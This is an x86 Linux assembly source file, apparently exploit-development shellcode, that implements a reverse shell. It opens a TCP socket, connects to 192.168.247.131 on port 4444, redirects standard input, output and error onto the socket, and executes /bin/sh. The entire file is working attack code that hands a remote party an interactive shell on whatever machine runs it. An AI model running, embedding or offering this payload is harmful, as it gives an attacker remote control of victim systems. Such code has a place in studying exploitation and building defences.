; reverse_shell.nasm

global _start

section .text

_start:
	
	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	;***************;
	; create socket ;
	;***************;


	; 0x66 for socketcall
	mov al, 0x66

	;0x1 for socket
	mov bl, 0x1
	

	push ecx	; 0x0
	push ebx	; 0x1 SOCK_STREAM

	push 0x2	; AF_INET

	; point ecx to the stack for args
	mov ecx, esp
	int 0x80	; socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, 0})

	; keep sockfd for later
	mov edi, eax


	;************************;
	; connect to ip and port ;
	;************************;


	; 0x66 for socketcall
	mov al, 0x66

	inc ebx
	
	; push struct to stack
	push 0x83f7a8c0		; ip: aton(192.168.247.131)

	push word 0x5C11	; port: htons(4444) - 0x5C11
	push bx			; AF_INET - 0x2

	inc ebx			; 0x3 SYS_CONNECT

	; store reference to struct
	mov ecx, esp

	; push connect args
	push 0x10	; size of struct
	push ecx	; struct sock_addr
	push edi	; sockfd

	mov ecx, esp
	int 0x80	; socketcall(SYS_CONNECT, {sockfd, sock_addr, addrlen})


	;******************;
	; redirect outputs ;
	;******************;


	mov ebx, edi	; sockfd arg
	xor ecx, ecx
	mov cl, 0x2	; set up counter

dup:
	mov al, 0x3f	; dup2
	int 0x80	; dup2(sockfd, [cl])
	dec ecx
	jns dup
	

	;*****************;
	; execute a shell ;
	;*****************;


	push edx	; null terminate the string
	push 0x68732f2f	; push hs//
	push 0x6e69622f	; push nib/

	mov ebx, esp	; move null terminated string into register

	mov ecx, edx	; 0x0
	mov al, 0xB	; syscall - execve
	int 0x80	; execve("/bin//sh", NULL, NULL)
